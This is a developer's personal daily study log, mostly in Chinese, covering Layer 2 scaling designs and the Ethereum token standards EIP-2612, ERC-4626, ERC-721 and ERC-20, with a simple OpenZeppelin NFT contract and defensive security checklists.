---
timezone: UTC+8
---

# Ray

**GitHub ID:** 3956ray

**Telegram:** @mmm lll

## Self-introduction

我是Ray，

## Notes

<!-- Content_START -->

# 2025-08-23
<!-- DAILY_CHECKIN_2025-08-23_START -->
# Layer2

\## Layer 2技术本质：模块化区块链架构范式

\### 可扩展性三难问题的技术解析

可扩展性三难问题由以太坊联合创始人Vitalik Buterin提出，指出区块链网络只能同时实现三个关键属性中的两个：

\* \*\*\*安全性\*\*（通过密码学保证的可靠共识和不可篡改性）

\* \*\*\*去中心化\*\*（广泛的网络控制和低参与门槛）

\* \*\*\*可扩展性\*\*（高交易吞吐量和低延迟费用）。

比特币（7 TPS）和以太坊（15 TPS）等Layer 1区块链优先保障安全性和去中心化，但这创造了吞吐量瓶颈。当需求超过容量时，网络出现拥堵，推高gas费用并增加确认时间。以太坊网络拥堵时，平均gas费可达100-200 gwei，单笔简单转账费用超过50美元。

\### 架构设计模式

Layer 2解决方案作为构建在Layer 1区块链之上的二级网络，遵循共同的架构模式：

\- **执行层**：使用专门的虚拟机在链外处理交易

\- **数据可用性层**：确保交易数据可供验证访问

\- **结算层**：将状态变更锚定到Layer 1以获得最终性和安全性

\- **共识层**：维护Layer 2节点间的一致性

这种模块化方法实现了水平扩展，同时保持底层区块链的安全保证。\*\*关键技术创新在于将计算与验证成本解耦\*\*，允许在链外执行复杂计算，仅在链上提交简洁证明或争议解决。

\## 核心技术实现机制

\### 状态通道：点对点交易架构

状态通道通过多重签名钱包构造实现直接的点对点交易：

**通道构建过程**：

1\. 参与者创建2-of-2多重签名地址

2\. 资金交易将资产锁定在多重签名合约中

3\. 初始状态承诺建立通道余额分配

4\. 双方生成并交换承诺交易

**技术组件**：

\- **可撤销序列成熟度合约（RSMCs）**：实现无信任余额更新

\- **哈希时间锁定合约（HTLCs）**：促进跨通道多跳支付

\- **承诺交易**：表示当前通道状态，由双方签署

**状态更新机制**采用密码学签名消息修改锁定状态存款。更新协议包括：提议状态变更、验证并签署新状态、存储最新承诺交易、通过惩罚机制使旧状态可撤销。安全属性包括\*\*最终性\*\*（链外更新因密码学签名被视为最终）、\*\*争议解决\*\*（惩罚机制防止提交过时状态）、\*\*挑战期\*\*（争议无效状态提交的时间窗口）。

**闪电网络实现**展示了高级状态通道实现：双向支付通道支持连续余额调整、洋葱路由保护隐私、多跳支付连接非直接连接方、层级通道实现灵活的链外通道调整。

\### 侧链：独立区块链架构

侧链作为具有独立共识机制的独立区块链运行，核心组件包括：独立共识协议（PoW、PoS、PoA、DPoS）、可定制区块参数（区块时间、大小、gas限制）、虚拟机（通常EVM兼容）、独立验证器网络。

**双向锚定机制**通过复杂的桥接协议实现主链和侧链间的资产转移。\*\*锚入过程\*\*：用户在主链智能合约中锁定资产→桥接验证器见证锁定交易→在侧链铸造等值资产→用户收到1:1锚定比例的侧链代币。\*\*锚出过程\*\*：用户销毁侧链资产→桥接提供销毁密码学证明→主链合约验证证明并释放锁定资产→资产返回用户主链地址。

**共识机制变体**包括：\*\*权威证明（PoA）\*\*具有已知身份的预选验证器，通过减少共识开销实现更快区块时间；\*\*委托权益证明（DPoS）\*\*代币持有者投票选择区块生产者；\*\*拜占庭容错（BFT）\*\*通过(n-1)/3容错提供即时最终性。

\### Rollup技术：状态压缩与证明系统

Rollup技术代表了Layer 2的最重要创新，通过将交易执行移到链外同时在链上维护数据可用性和争议解决能力。

\#### Optimistic Rollups架构深度解析

**交易处理流水线**：

1\. **排序器操作**：中心化实体排序和执行交易

2\. **状态根计算**：批量执行后计算新的Merkle根

3\. **批次提交**：将压缩的交易数据和状态根发布到L1

4\. **挑战期**：7天窗口用于提交欺诈证明

**欺诈证明机制**经历了重要演进。\*\*非交互式欺诈证明\*\*要求L1重新执行争议批次中的所有交易，由于高gas成本和L1/L2执行差异被Optimism放弃。\*\*交互式欺诈证明\*\*采用二分搜索方法隔离争议指令，挑战者和防御者提交交替声明，显著降低链上计算成本，仅由Arbitrum通过白名单挑战者实现。

**EVM兼容性挑战**包括：\*\*上下文修改\*\*（L2交易必须在L1上相同执行）、\*\*状态管理器合约\*\*（在欺诈证明期间拦截存储操作）、\*\*确定性执行\*\*（确保跨环境的可重现结果）。

\#### Zero-Knowledge Rollups技术深度分析

**有效性证明生成过程**：

1\. **交易执行**：在zkEVM中链外处理批次

2\. **见证生成**：创建执行的计算轨迹

3\. **证明生成**：应用零知识证明系统

4\. **验证**：L1合约验证密码学证明

**密码学证明系统对比**：

**zk-SNARKs**（简洁非交互式知识论证）具有小证明大小（约200字节）、快速验证的属性，但需要可信设置和基于椭圆曲线密码学（量子脆弱）。应用案例包括zkSync、Hermez、Scroll实现。

**zk-STARKs**（可扩展透明知识论证）无需可信设置、抗量子攻击，但证明大小更大、生成时间更长，在计算复杂性方面表现更好。应用案例包括StarkNet、StarkEx实现。

**状态表示和更新**通过Merkle树结构存储账户余额和合约存储，通过状态根更新原子性提交批次结果到L1，批次根为包含批次中所有交易的Merkle树，数据压缩通过高效编码最小化链上数据。

**zkEVM实现挑战**包括：\*\*虚拟机兼容性\*\*（将EVM操作码转换为零知识电路）、\*\*Gas计量\*\*（维持与以太坊一致的gas成本）、\*\*预编译\*\*（支持以太坊内置密码学函数）、\*\*状态访问\*\*（为存储操作提供高效证明生成）。

**证明系统优化**采用递归证明聚合多个交易证明、并行证明在多核间分布证明生成、硬件加速通过GPU和FPGA优化证明生成。

\### 数据可用性解决方案技术机制

Layer 2解决方案面临数据可用性挑战：在不要求所有节点下载的情况下证明交易数据可访问。这对于轻客户端验证、欺诈证明生成、链重构至关重要。

**链上数据可用性（以太坊）**包括：\*\*CALLDATA存储\*\*提供永久链上存储但成本较高，\*\*Blob交易（EIP-4844）\*\*提供临时数据存储（约18天）成本降低，为完整数据分片做准备。

**链外数据可用性解决方案**：

**Celestia模块化架构**采用\*\*数据可用性采样（DAS）\*\*让轻节点通过随机采样验证可用性，\*\*2D Reed-Solomon编码\*\*为格式错误的数据提供高效欺诈证明，\*\*命名空间Merkle树（NMTs）\*\*允许应用仅下载相关数据，\*\*可用性证明\*\*提供数据已可用的密码学保证。

**NEAR数据可用性**通过原型dank分片增加数据分片吞吐量，链外轻客户端验证数据发布，成本效率比以太坊L1存储便宜8000倍。

**Avail网络**作为专用DA层，具有独立共识、KZG承诺、擦除编码容错。

\### 欺诈证明vs有效性证明：算法基础

**欺诈证明系统**采用挑战-响应协议：断言阶段（排序器提交状态转换声明）→挑战阶段（验证器用反证据争议声明）→二分协议（二分搜索隔离争议计算）→解决阶段（争议指令的链上执行）。

安全属性包括\*\*1-of-N信任模型\*\*（单个诚实验证器可以防止欺诈）、\*\*经济安全\*\*（保证金要求和削减条件）、\*\*挑战期\*\*（争议解决的时间延迟）。

**有效性证明系统**提供非交互式验证，通过证明系统生成正确执行的密码学证明，L1智能合约验证证明，无需挑战期的即时最终性。零知识属性包括\*\*完整性\*\*（有效陈述总是产生接受证明）、\*\*健全性\*\*（无效陈述无法产生接受证明）、\*\*零知识\*\*（证明不泄露私有输入信息）。

\## 以太坊Layer 2生态技术实现对比

\### 主流项目技术栈差异

**Arbitrum高级Optimistic Rollup架构**采用Arbitrum虚拟机（AVM）高层抽象、ArbOS管理状态和资源、BoLD（有界流动性延迟）交互式多轮欺诈证明、双重编译（本机Go执行，WebAssembly证明模式）。关键创新包括交互式证明使用二分博弈、状态转换函数分离执行和证明、6.4天挑战窗口。性能指标：理论TPS 2,000-4,000，当前峰值约60 TPS，gas节省约90%。

**Optimism模块化OP Stack基础**使用EVM等效最小修改、Cannon FPVM故障证明虚拟机、单轮欺诈证明、OP Stack模块化设计。技术创新包括基于MIPS的确定性故障证明生成、多证明架构支持、Superchain愿景标准化框架、阶段1去中心化成就。

**Polygon多解决方案生态**包括PoS侧链、zkEVM、Plasma实现。Type 2 zkEVM（EVM等效轻微修改）、STARK生成SNARK验证的混合证明策略、模块化zkNode支持排序器/聚合器/RPC模式。关键创新：效率证明共识机制、可信/虚拟/合并状态层、去中心化L1-L2桥接。

**StarkNet自定义VM与原生账户抽象**采用Cairo VM（非EVM兼容）、Cairo编程语言Rust语法、纯STARK证明、所有账户原生抽象。技术创新：Cairo语言演进（从Cairo Zero到现代Cairo）、自定义算术域STARK优化、每个账户都是智能合约、Cairo VM并行执行设计。

**zkSync Type 4 zkEVM与递归证明**使用Type 4 zkEVM（编译Solidity/Vyper到zkEVM友好格式）、Boojum升级混合STARK+SNARK、LLVM编译器、ZK Stack自定义rollup和validium。技术创新：zk-STARKs包装在zk-SNARKs中、递归SNARKs证明聚合、节点专业化、zkPorter链外数据可用性。

\### 虚拟机架构对比

**EVM兼容解决方案**：Optimism/Base最小EVM修改实现最大兼容性，Arbitrum AVM提供高层抽象维持EVM兼容性，Polygon zkEVM Type 2轻微EVM修改优化证明效率。

**EVM等效解决方案**：Linea Type 2 zkEVM完整EVM等效，zkSync Type 4编译高级语言到zkEVM格式。

**自定义VM解决方案**：StarkNet Cairo VM专为STARK证明构建，非EVM兼容但通过Warp支持Solidity转译。

\### 性能指标对比分析

**理论vs观察TPS**：StarkNet理论吞吐量最高、无限扩展潜力；zkSync理论2,000 TPS、观察AMM交易181 TPS；Arbitrum理论2,000-4,000 TPS、峰值约60 TPS；Base/Optimism基于共享OP Stack架构类似Arbitrum。实际性能：合并L2生态系统246 TPS（2024年6月），以太坊主网15-30 TPS基线，主要L2平均成本降低94%。

**最终性时间和提取期**：\*\*即时最终性（ZK Rollups）\*\*- StarkNet证明验证即时最终性、Polygon zkEVM快速最终性、zkSync有效性证明即时最终性、Linea无欺诈证明延迟；\*\*乐观最终性\*\*- Arbitrum 6.4天挑战期、Optimism/Base 7天挑战期、争议解决保证最多2个挑战期提取。

\## Solana Layer 2生态分析

\### 技术需求分析

Solana的高性能架构（65,000+ TPS，400ms区块时间）呈现独特的L2需求：\*\*本地费用市场\*\*防止应用间拥堵溢出、\*\*并行执行\*\*维持Solana Sealevel运行时优势、\*\*跨链互操作性\*\*访问外部生态系统和流动性。

\### 主要项目技术实现

**Eclipse（以太坊L2与SVM）**采用模块化方法：以太坊（结算）、SVM（执行）、Celestia（数据可用性）、RISC Zero（欺诈证明）。作为首个基于SVM的以太坊L2，在以太坊基础设施上进行并行交易处理。主网2024年11月启动，拥有60+dApps，生成11.5亿+美元费用。技术特色：GSVM（千兆级虚拟机）、GPU/FPGA优化的硬件-软件协同设计。

**Nitro（Cosmos集成）**为SVM兼容L2，通过IBC协议连接Solana到Cosmos生态系统，性能20,000 TPS和600ms最终性，首次SVM标准化超越Solana原生生态系统，桥接Solana开发者社区和Cosmos互操作性。

\### 与以太坊Layer 2技术差异

**并行vs顺序执行**：SVM维持并行处理能力vs EVM顺序模型；\*\*账户模型\*\*：Solana基于账户的架构vs以太坊账户/合约区别；\*\*状态管理\*\*：直接状态访问vs以太坊基于存储的模型；\*\*费用结构\*\*：优先费用和计算单位vs基于gas的定价。
<!-- DAILY_CHECKIN_2025-08-23_END -->

# 2025-08-22

# EIP‑2612 Permit
一、简介
- EIP‑2612 是 ERC‑20 的扩展，使用户可以通过链下 EIP‑712 结构化签名，授权某个 spender 使用自己的代币（approve），再由任意人上链执行 permit 完成授权。
- 核心价值：把“授权”从一笔链上交易，变为一份链下签名；上链执行者可以是 dApp/合约/第三方，从而实现无 gas 授权（用户无需持有原生代币支付 gas）。

二、解决的关键问题
- 授权需要两笔交互的问题
  - 传统流程：先 approve（用户付 gas），再由 dApp 调用 transferFrom。
  - Permit：先离线签名，再由 dApp 一笔交易同时执行 permit + transferFrom，减少交互与延迟。
- 用户无 ETH 无法授权的问题
  - 授权由第三方代付执行（含合约聚合器），提升新用户体验（gasless onboarding）。
- 安全与可读性
  - 使用 EIP‑712 Typed Data，签名内容可读（包含 token 名称、链 ID、过期时间、nonce 等），并具备重放保护与过期控制。
- 跨链/分叉重放保护
  - 通过 Domain Separator（包含 chainId 与 verifyingContract）防止跨链/分叉重放。

三、技术实现（核心要点）
1) 新增接口与存储（相对 ERC‑20）
- 接口
  - permit(owner, spender, value, deadline, v, r, s)
  - nonces(owner) → uint256
  - DOMAIN_SEPARATOR() → bytes32
- 存储
  - mapping(address => uint256) nonces;

2) EIP‑712 域与类型
- EIP‑712 域：name（通常与代币名一致）、version（常用 "1"）、chainId、verifyingContract。
- 类型哈希（标准版）：
  - PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")

3) 签名消息构造
- digest = keccak256(
  0x1901 || DOMAIN_SEPARATOR || keccak256(abi.encode(
    PERMIT_TYPEHASH, owner, spender, value, nonces[owner], deadline
  ))
)
- 使用 ECDSA.recover(digest, v, r, s) 得到 signer，应等于 owner。

4) 校验与状态变更流程
- 要求 block.timestamp <= deadline（未过期）
- 校验签名者 == owner
- 使用并自增 nonces[owner]（防重放）
- 设置 allowance[owner][spender] = value
- 发出标准 Approval 事件（与普通 approve 一致）

5) 重要安全注意
- 用非对称签名恢复（ECDSA），一般支持 65 字节签名（r,s,v），也可支持 EIP‑2098 的 64 字节压缩签名（依赖库）。
- nonces 必须是 per-owner 递增计数，确保同一签名不可重放。
- deadline 必须参与签名并严格校验。
- DOMAIN_SEPARATOR 建议在链 ID 变化时可重新计算（主流实现采用缓存+链 ID 检测）。

四、典型交互流程
- 离线（前端/后端）：构造 TypedData，用户用钱包对 Permit 签名，得到 v/r/s。
- 上链（由 dApp/合约/第三方执行）：
  - 直接调用 token.permit(...) 完成授权；
  - 随后立刻执行 transferFrom（或在聚合合约中先 permit 再 transferFrom 一次性完成）。

五、与相关标准/变体的关系
- 与 EIP‑712：Permit 基于 EIP‑712 Typed Data。
- 与 EIP‑1271（合约账户验签）：EIP‑2612 原生是 EOA 签名模型，许多实现不直接支持 1271。若要兼容智能钱包，常见做法是使用 Permit2 或在上层合约中对 1271 做额外支持。
- 与 Permit2（Uniswap 提案，非 EIP）：统一/增强授权体验、支持批量、有效期与 1271，适合跨代币/跨协议授权管理。
- 与 DAI 早期 permit：DAI 的 permit 使用 allowed 布尔值的变体，EIP‑2612 最终采用 value 风格更贴近 ERC‑20。

六、前端集成要点
- 必须使用 eth_signTypedData_v4（或等价）按 EIP‑712 结构签名。
- 动态读取 chainId、token.name、verifyingContract，并与合约中的 DOMAIN_SEPARATOR 保持一致。
- 未必所有 ERC‑20 都支持 permit，需做能力探测：
  - 尝试静态调用 permit 或读取 nonces/DOMAIN_SEPARATOR，失败则回退到传统 approve 流程。
- 强制设置 deadline（如当前时间 + 10 分钟）并在后端落地“即签即用”。

七、常见坑
- 确保 version/name 与合约内部一致（不一致会导致签名永远不通过）。
- 不要忽略 nonce 获取与自增；签名前从链上读取 nonces(owner)。
- 对于合约钱包/4337 智能账户，优先评估 Permit2 或支持 EIP‑1271 的方案。
- 注意与“先前 approve 余额”的交互策略（如是否覆盖或采用增加/减少授权的接口）。

# 2025-08-21

# ERC 4626
1) 规范全景（接口、事件、边界、实现自由度）
- 核心概念
  - 资产 assets：Vault 所托管的底层 ERC‑20 代币（资产侧）。
  - 份额 shares：Vault 对用户的凭证（份额侧，本质上是一个 ERC‑20）。
  - 价格 price-per-share（pps）：pps = totalAssets / totalSupply（注意舍入与 0 供给场景）。
- 必选接口（关键函数族）
  - 资产与会计：asset()、totalAssets()
  - 转换：convertToShares(assets)、convertToAssets(shares)
  - 预览：previewDeposit、previewMint、previewWithdraw、previewRedeem
  - 上限：maxDeposit、maxMint、maxWithdraw、maxRedeem
  - 核心动作：deposit、mint、withdraw、redeem
- 事件
  - Deposit(caller, owner, assets, shares)
  - Withdraw(caller, receiver, owner, assets, shares)
  - 另外还会有 ERC‑20 的 Transfer/Approval 事件（针对 shares）
- 边界与约束
  - 预览函数不应修改状态，应与实际执行路径的舍入方向保持一致。
  - maxXxx 用于传达可行边界（额度/流动性/策略限制），做为路由与前端的“护栏”。
  - totalAssets 可为“真实余额 + 策略应计”，实现者有自由度，但必须与实际可提取价值相符。
- 实现自由度与常见裁剪点（以库为参照）
  - 初始兑换率：当 totalSupply == 0 时的 shares↔assets 初始比率，多数实现默认 1:1，也可自定义（需清晰文档化）。
  - decimals：OZ 会尝试与底层资产 decimals 对齐；SM 默认 18，可自定义构造。
  - max 系列默认行为：通常默认无限或不限制，但生产上应结合风控/队列/策略流动性进行约束。
  - 策略/费用扩展：规范不含 fee 模型与策略接口，实现可在内部扩展（例如扣费铸份机制、harvest 钩子等）。

2) 函数语义与舍入（数学关系、单调性、极端场景）
- 数学关系（常见安全舍入约定）
  - shares = assets * totalSupply / totalAssets
  - assets = shares * totalAssets / totalSupply
  - 典型舍入方向（保持用户不吃亏/金库不吃亏的一致性）
    - previewDeposit(assets) → shares 使用向下取整 floor（避免过度发放 shares）
    - previewMint(shares) → assets 使用向上取整 ceil（确保付足资产才能铸得 shares）
    - previewWithdraw(assets) → shares 使用向上取整 ceil（确保烧足 shares 才能取出资产）
    - previewRedeem(shares) → assets 使用向下取整 floor（避免过度支付资产）
  - 单调性要求：资产与份额的双向转换应单调；totalAssets/totalSupply 的变化应一致反映在 preview 与实际执行上。
- 与 preview/max/totalAssets 的一致性
  - previewXxx 与实际 deposit/mint/withdraw/redeem 的内部计算必须同向舍入，否则将被可利用为报价欺诈/拒绝服务。
  - maxXxx 应考虑流动性与限制：例如策略资金回流延迟、提款队列、额度上限与角色权限；并且与 revert 条件对应。
- 极端场景建议
  - 流动性不足：maxWithdraw/maxRedeem 返回低值；withdraw/redeem 不应“部分成交”，而是通过 max 护栏引导上层分拆请求。
  - 0/1 最小份额：避免初始小额导致后续四舍五入锁尘。常见做法：由治理账户进行 seed deposit 或在首次 deposit 强制最小规模（并文档化）。
  - 精度差异：资产与份额 decimals 不同（如 6 vs 18），务必使用安全的乘除顺序与 mulDivDown/Up（SM）或 OZ 的 Math 库，避免中间溢出与精度丢失。
  - 非标准资产：fee‑on‑transfer 或 rebasing 资产导致“转账入账值 ≠ 请求值”，preview 必须与实际路径对齐（详见第 5 点）。

3) 技术演进与实现对比
- 变更点与已知坑（参考 2022–2025 ）
  - 舍入策略趋于统一：社区已基本形成上述四条路径的“floor/ceil”约定，避免报价前后不一致。
  - preview 一致性意识增强：早期常见“preview 乐观，实际更保守”导致路由失败或可被博弈，现应确保纯函数逻辑与实际执行复用同一计算路径。
  - fee 计提与会计一致性：从“直接扣资产”逐步倾向“铸份到 feeRecipient”并保持老持有人不受损（抗稀释设计），并在事件中透明化。
  - rebasing 兼容：totalAssets 需以“可提取价值”为准，避免单看 balanceOf 或错误缓存；对 rebase 事件需有防御/校验。
  - max 函数安全护栏：从默认无限，演进为考虑提款队列、延时、角色开关、冻结模式（withdraw-only），以减少运行期风险。
- 库实现对比（OZ v5 vs Solmate）
  - 安全性与完备度：OZ 偏安全保守，默认 SafeERC20、对 decimals 与 return 值更稳妥；SM 偏极简与 gas 优化，提供 mulDivDown/Up 等数学工具，要求使用者更自律。
  - 舍入实现：两者均提供 Down/Up 路径，但 OZ 更注重与 ERC‑20 生态的“非标准返回值/失败”适配；SM 更清晰地暴露向上/向下的选择权与成本。
  - decimals：OZ 经常对齐底层资产精度，降低集成复杂度；SM 常由开发者在构造函数中显式设定，灵活但需谨慎。
  - maxXxx 默认：两者默认都较宽松；生产应覆写以接入限额与风控逻辑（如管理侧限额、策略侧可用流动性、黑白名单）。
  - 扩展与组合：OZ 与上层 RBAC、Pausable、UUPS 升级模式整合度高；SM 与自定义策略/数学库/汇总器组合自由度高。

4) 安全与不变式（攻击面、PoC 场景、缓解建议）
- 攻击面与误用清单
  - preview 与实际不一致：路由/聚合器被“乐观报价”误导，用户或协议遭遇失败/滑点过大。
    - 防御：公用同一转换函数；测试覆盖“preview == 实际路径”断言；引入 max 护栏。
  - 份额稀释/膨胀：fee 计提或捐赠 donation 顺序不当，导致老持有人权益受损。
    - 防御：采用“给 feeRecipient 铸份”而非直接扣底层资产；在事件中透明化；加入上/下限与延时治理。
  - 闪电贷操纵 totalAssets/pps：瞬间存取/donate 干扰报价或清算。
    - 防御：对关键操作使用 TWAP 或延迟结算；策略侧快照；在路由侧加大滑点保护与多源报价。
  - 非标准 ERC‑20：fee‑on‑transfer/rebasing 导致会计错配与事件不一致。
    - 防御：以实际入账/出账为准更新会计；对 rebasing 采用“拉取式读取 + 上下限校验”；在 max/preview 中体现真实限制。
  - 授权与重入：shares 是 ERC‑20，若叠加 777/1363 或外部回调策略，需防重入与权限滥用。
    - 防御：ReentrancyGuard；pull 模式；外部调用最小化；严格的角色与延时，禁止在关键路径中可重入外部合约。
  - 事件与状态不一致：Deposit/Withdraw 与 ERC‑20 Transfer 次序或数量不一致，影响索引与合规审计。
    - 防御：测试断言事件与状态的一致性；失败即回滚。
  - permit/nonce：若 shares 实现了 EIP‑2612，必须保证 nonce 单调与域分隔正确。
    - 防御：覆盖 chainId 变化；deadline 检查；重放防护。
- 关键不变式（建议纳入 invariant/fuzz）
  - 会计守恒：sum(userShares) == totalSupply；convert/preview 与 totalAssets/totalSupply 一致。
  - 价格单调：无外部注入/扣减时，pps 变化应可解释且与 fee/收益事件一致。
  - 事件一致性：Deposit/Withdraw 与 ERC‑20 Transfer 事件对应关系一致。
  - 预览一致：previewXxx 的结果与实际路径相同的舍入方向与边界。
  - 许可安全（可选）：permit nonce 单调递增；签名域分隔不变。

5) 生态应用与兼容性（DEX/借贷/聚合器/收益金库/LST/LRT/RWA）
- DEX/路由
  - 一些路由支持 4626 包装/解包（wrap/unwrap）路径；若未原生支持，需事先 unwrap 成 assets 再交易。
  - 报价与滑点：务必使用 preview + max 护栏，并考虑 flash/donation 干扰导致的 pps 偏移。
- 借贷/抵押
  - 抵押品定价：以 pps * assetPrice；若策略收益受延迟或预估，应采用 TWAP/预言机与安全边界。
  - 清算：赎回路径需有足够流动性；对提款队列或延时做风控参数与文档化。
- 聚合器/收益金库（Vault-of-Vaults）
  - 组合多层 4626 容易产生舍入连锁误差；建议在上层进行批量化与对冲 rounding，或统一向上/向下策略。
  - 复杂 fee 模型叠加时，测试“多 hop + fee + rebase”的边界路径。
- LST/LRT（质押衍生）
  - pps 单调上行是主预期；需防止 large donation/fee 事件造成短时跳变冲击聚合器。
  - 与共识层赎回/再质押周期联动，设置 maxWithdraw/maxRedeem 的时间窗约束。
- RWA 托管
  - totalAssets 可能依赖托管清算周期/估值；必须在文档/事件中透明化估值延迟，避免赎回挤兑。
- 非标准资产适配
  - fee‑on‑transfer：以实际入账金额记账；preview 应以“预估实际入账”为准（或在 UI/路由层设置安全折扣）；事件使用实际金额。
  - rebasing：避免缓存资产余额；convert 基于最新 balanceOf；必要时加入“可提现上限”与“最小赎回单位”保护。
  - 税费/黑名单：maxXxx 应反映限制；失败路径清晰回滚与错误信息；必要时加入白名单与可暂停开关。

- 开发侧
  - 统一转换路径：将 convert/preview 与实际执行共享同一内部函数，确保一致性。
  - 舍入策略固定并文档化：按“deposit/redeem 向下；mint/withdraw 向上”实施，写入注释与 NatSpec。
  - maxXxx 接入风控：额度、队列、延时、策略流动性、黑白名单；对外披露治理参数。
  - 事件完整：Deposit/Withdraw 与 Transfer 顺序与数额一致；异常路径全回滚。
  - 资产兼容层：抽象一个 SafeAsset 适配层，处理 fee‑on‑transfer/非标准返回值；对 rebasing 做读取与上/下限校验。
  - 性能：缓存不可变的 decimals；使用安全的 mulDivDown/Up；避免重复外部调用；批量操作与 unchecked 安全使用。
- 测试侧（Foundry 建议）
  - 单测：四条主路径 + preview/convert/max/totalAssets/decimals；事件对齐。
  - Fuzz：随机多用户多序列存取赎回；引入 donation、闪电贷扰动。
  - Invariant：会计守恒、事件一致、preview 一致、pps 单调/可解释。
  - 非标准资产模拟：fee‑on‑transfer、rebasing、拒收/延迟、返回值非标准。
- 运维与监控
  - 指标：totalAssets、totalSupply、pps、maxXxx、失败率、fee 速率、harvest 间隔。
  - 告警：preview 与实际偏差阈值、pps 突变、rebase 异常、提款队列拥塞。
  - 应急：Pausable/Guardian；只提款模式；策略下线/切换流程；参数变更与延时治理。
- 升级与权限（若用可升级模式）
  - 角色矩阵：Owner/Admin/Guardian/Strategy/Harvester；最小授权 + timelock。
  - 存储槽与 __gap 稳定；升级回归测试覆盖 rounding/fee/preview 一致性；状态快照前后对账。

# 2025-08-20

一、定义与背景
- 定义：ERC‑721 是以太坊最早、最广泛使用的“非同质化代币”（NFT）标准，核心特性是“唯一性 + 可确权归属”，每个 tokenId 代表一个不可互换的资产单元。
- 标准目标：
  - 标准化拥有者查询、转移、授权与元数据访问的接口；
  - 为合约间 NFT 交互提供强约束（如 safeTransfer 的合约接收回调）；
  - 与钱包、市场、浏览器等基础设施的互操作性。
- 对比 ERC‑20/EIP‑1155：
  - ERC‑20 可替代；ERC‑721 完全非同质；
  - ERC‑1155 为多代币/半同质模型，适合大规模铸造与批量转移；ERC‑721 更强调 “每个 tokenId 是独立实体”。

二、核心接口与事件
- IERC165：接口检测
  - 合约需实现 supportsInterface(bytes4 interfaceId)
- IERC721：核心
  - balanceOf(owner)、ownerOf(tokenId)
  - approve(to, tokenId)、getApproved(tokenId)、setApprovalForAll(operator, approved)、isApprovedForAll(owner, operator)
  - transferFrom(from, to, tokenId)、safeTransferFrom(from, to, tokenId[, data])
  - 事件：Transfer、Approval、ApprovalForAll
- IERC721Receiver：合约安全接收回调
  - onERC721Received(operator, from, tokenId, data) -> bytes4
  - safeTransferFrom 若目标是合约，必须返回正确的 selector，否则 revert
- IERC721Metadata（可选但行业事实标准）
  - name()、symbol()、tokenURI(tokenId)
- IERC721Enumerable（可选，不再推荐用于大规模集合）
  - tokenOfOwnerByIndex、totalSupply、tokenByIndex（链上枚举成本高）
- 常见扩展
  - EIP‑2981: 版税标准（royaltyInfo）
  - EIP‑2309: 批量铸造事件（ConsecutiveTransfer）用于部署期大批量 mint 记账
  - EIP‑4494: NFT Permit（签名授权，无需先 on-chain approve）
  - EIP‑4907: 可租用角色（user/expiry）

三、实现要点与存储结构
- 典型存储
  - mapping(uint256 => address) _ownerOf
  - mapping(address => uint256) _balanceOf
  - mapping(uint256 => address) _tokenApprovals
  - mapping(address => mapping(address => bool)) _operatorApprovals
- 必备不变量
  - ownerOf(tokenId) 非零地址代表已存在
  - balanceOf 与 Transfer 事件保持一致性
  - 转移后应清空 token 级别的 single-approval
- 转移安全
  - 对未知地址优先使用 safeTransferFrom，避免 NFT 被转进不支持的合约导致“黑洞”
  - checks-effects-interactions 原则：在对外调用前更新状态，必要时加 ReentrancyGuard
- 元数据
  - tokenURI 返回 JSON 元数据 URL（可 HTTP/IPFS/Arweave/data URI）
  - 大集合建议 baseURI + tokenId 拼接，或 on-chain SVG/JSON（需注意 gas）
- 构造 tokenId
  - 常用自增计数器（如 OpenZeppelin Counters）
  - 若需随机/稀有度分布，慎用链上随机（需 VRF/预承诺等抗操纵机制）
- Gas/可扩展性
  - 尽量避免 IERC721Enumerable；链上枚举昂贵
  - 大规模集合：考虑 EIP‑2309、稀疏存储压缩、或使用优化实现（如批量 mint 的 gas 模式、稀疏 ownership 记录）
  - 升级性：使用代理（UUPS/Transparent），注意构造函数逻辑迁移到 initializer

四、可用 ERC‑721（基于 OpenZeppelin）
包含：安全转移、BaseURI、仅拥有者铸造

```solidity:contracts/MyNFT.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

contract MyNFT is ERC721, Ownable {
    using Strings for uint256;

    string private _baseTokenURI;
    uint256 private _nextId;

    constructor(string memory name_, string memory symbol_, string memory baseURI_) ERC721(name_, symbol_) Ownable(msg.sender) {
        _baseTokenURI = baseURI_;
        _nextId = 1;
    }

    function setBaseURI(string calldata baseURI_) external onlyOwner {
        _baseTokenURI = baseURI_;
    }

    function mint(address to) external onlyOwner returns (uint256 tokenId) {
        tokenId = _nextId++;
        _safeMint(to, tokenId); // 使用 safeMint，自动调用 onERC721Received
    }

    function _baseURI() internal view override returns (string memory) {
        return _baseTokenURI;
    }

    // 如果需要自定义 tokenURI，可覆盖如下
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        _requireOwned(tokenId);
        string memory base = _baseURI();
        return bytes(base).length > 0 ? string(abi.encodePacked(base, tokenId.toString(), ".json")) : "";
    }
}
```

# 2025-08-19

# 1. EIP-20

**强制接口**

- `totalSupply() → uint256`
    
- `balanceOf(address) → uint256`
    
- `transfer(address to, uint256 value) → bool`
    
- `allowance(address owner, address spender) → uint256`
    
- `approve(address spender, uint256 value) → bool`
    
- `transferFrom(address from, address to, uint256 value) → bool`
    
- 事件：`Transfer(address indexed from, address indexed to, uint256 value)`；`Approval(address indexed owner, address indexed spender, uint256 value)`
    

**可选元数据（主流实现都提供）**

- `name()`, `symbol()`, `decimals()`（通常 18）
    

**语义与细节**

- **返回值必须是 `bool true`**（历史上一些老合约不返回值，DeFi 里需用 SafeERC20 适配）。
    
- **Mint/Burn 的事件：**
    
    - 铸造：`from = address(0)` 的 `Transfer(0, to, value)`
        
    - 销毁：`to = address(0)` 的 `Transfer(from, 0, value)`
        
- **Approve 竞态（Allowance Race）**：如果 spender 已有额度 A，你把额度改为 B，在 Mempool 可被“夹击”（先花光 A 再把 B 生效）。
    
    - 缓解：先 `approve(spender, 0)` 再设置新额度；或直接用 **EIP-2612 permit**／**Permit2**。
        

# 2. DeFi 里最容易“踩雷”的行为与对策

- **前置授权两步流（approve→transferFrom）**：用户体验差、Gas 多、且有前述竞态。  
    ✅ **对策**：优先支持 **EIP-2612 Permit**（或引导用户/前端使用 Uniswap **Permit2**）。
    
